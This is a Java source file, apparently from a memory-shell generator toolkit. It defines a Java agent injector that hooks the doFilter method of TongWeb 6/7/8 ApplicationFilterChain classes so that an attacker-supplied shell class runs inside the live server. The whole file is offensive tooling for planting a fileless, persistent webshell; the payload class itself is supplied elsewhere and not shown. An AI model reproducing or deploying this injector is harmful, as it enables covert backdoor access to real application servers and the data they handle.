package org.leo.jmg.mem.injectortpl.tongweb;

import org.leo.jmg.mem.agent.AgentInjectorSupport;

import java.lang.instrument.Instrumentation;

/** TongWeb 6/7/8 ApplicationFilterChain#doFilter Agent 注入器。 */
public class TongWebFilterChainAgentInjector extends AgentInjectorSupport {
    private static String shellClassName;
    private static String shellClass;
    private static final String[] TARGET_CLASSES = new String[]{
            "com/tongweb/web/thor/core/ApplicationFilterChain",
            "com/tongweb/catalina/core/ApplicationFilterChain",
            "com/tongweb/server/core/ApplicationFilterChain"
    };

    public static void premain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new TongWebFilterChainAgentInjector());
    }

    public static void agentmain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new TongWebFilterChainAgentInjector());
    }

    @Override
    protected String[] targetClasses() {
        return TARGET_CLASSES;
    }

    @Override
    protected String targetMethodName() {
        return "doFilter";
    }

    @Override
    protected String shellClassName() {
        return shellClassName;
    }

    @Override
    protected String shellClassPayload() {
        return shellClass;
    }
}
